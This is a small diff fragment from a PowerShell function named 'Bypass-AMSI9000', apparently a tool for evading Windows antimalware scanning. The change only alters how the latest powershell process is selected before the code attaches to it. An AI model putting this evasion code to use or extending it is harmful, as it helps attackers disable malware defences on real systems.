@@ -31,7 +31,7 @@ function Bypass-AMSI9000 {
 	Catch {
 		Write-Output "Unknown Error."
 	}
-	foreach ($Process in $(Get-Process powershell | Sort-Object id -Desc | Select-Object -first 1).Id) {
+	foreach ($Process in $(Get-Process powershell).Id | Sort-Object id -Descending | Select-Object -first 1) {
 		Try {
 			Enter-PSHostProcess -Id $Process
 		}
